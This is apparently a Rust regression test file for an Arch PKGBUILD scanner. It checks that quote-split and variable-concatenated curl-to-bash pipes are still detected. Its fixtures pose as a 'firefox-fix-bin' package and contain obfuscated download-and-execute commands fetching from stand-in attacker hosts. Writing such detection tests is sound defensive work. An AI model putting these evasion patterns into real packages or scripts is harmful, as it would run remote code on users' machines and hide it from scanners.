//! Regression tests from upstream issue #23: quote splitting must not hide a
//! download-and-execute pipe from the findings.

use traur::coordinator::scan_pkgbuild;

const SPLIT_CURL_PIPE: &str = r#"pkgname=firefox-fix-bin
pkgver=1.0.0
pkgrel=1
pkgdesc='Fixes for Firefox browser'
arch=('x86_64')
url=''
license=()
source=("https://github.com/attacker/patches/raw/main/patch.tar.gz"
        "http://192.168.1.100/payload.sh")
md5sums=('SKIP'
         'SKIP')

package() {
    cu""rl -s https://bit.ly/malware | ba""sh
    install -Dm755 patch "$pkgdir/usr/bin/firefox-fix"
}
"#;

const VAR_CONCAT_CURL_PIPE: &str = r#"pkgname=firefox-fix-bin
pkgver=1.0.0
pkgrel=1
pkgdesc='Fixes for Firefox browser'
arch=('x86_64')
url=''
license=()
source=("https://github.com/attacker/patches/raw/main/patch.tar.gz")
md5sums=('SKIP')

package() {
    x=cu;y=rl;$x$y -s https://bit.ly/malware | bash
}
"#;

fn ids(name: &str, content: &str) -> Vec<String> {
    scan_pkgbuild(name, content)
        .signals
        .into_iter()
        .map(|s| s.id)
        .collect()
}

#[test]
fn unsplit_curl_pipe_is_reported() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let ids = ids("firefox-fix-bin", pkgbuild);
    assert!(ids.iter().any(|i| i == "P-CURL-PIPE"), "got: {ids:?}");
}

#[test]
fn quote_split_curl_pipe_is_reported() {
    let result = scan_pkgbuild("firefox-fix-bin", SPLIT_CURL_PIPE);
    let curl = result
        .signals
        .iter()
        .find(|s| s.id == "P-CURL-PIPE")
        .expect("quote-split curl|bash must still produce P-CURL-PIPE");
    assert_eq!(
        curl.matched_line.as_deref(),
        Some(r#"cu""rl -s https://bit.ly/malware | ba""sh"#),
        "the finding must point at the original source line"
    );
    assert!(result.signals.iter().any(|s| s.id == "SA-QUOTE-SPLIT-EXEC"));
}

#[test]
fn var_concat_curl_pipe_is_reported() {
    let ids = ids("firefox-fix-bin", VAR_CONCAT_CURL_PIPE);
    assert!(
        ids.iter().any(|i| i.starts_with("SA-")),
        "variable-concatenated curl|bash must be reported, got: {ids:?}"
    );
}

#[test]
fn quoted_but_benign_build_has_no_exec_findings() {
    let content = r#"pkgname=benign
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com'
license=('MIT')
source=("https://example.com/benign-$pkgver.tar.gz")
sha256sums=('8b0d8b9d9d5d6f1f2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a')

build() {
    cd "$srcdir/benign-$pkgver"
    echo "building with flags" && make -j"$(nproc)"
}

package() {
    cd "$srcdir/benign-$pkgver"
    make DESTDIR="$pkgdir" install
}
"#;
    let ids = ids("benign", content);
    assert!(
        !ids.iter().any(|i| i == "SA-QUOTE-SPLIT-EXEC" || i == "P-CURL-PIPE"),
        "a normal quoted PKGBUILD must not report an exec pipe, got: {ids:?}"
    );
}
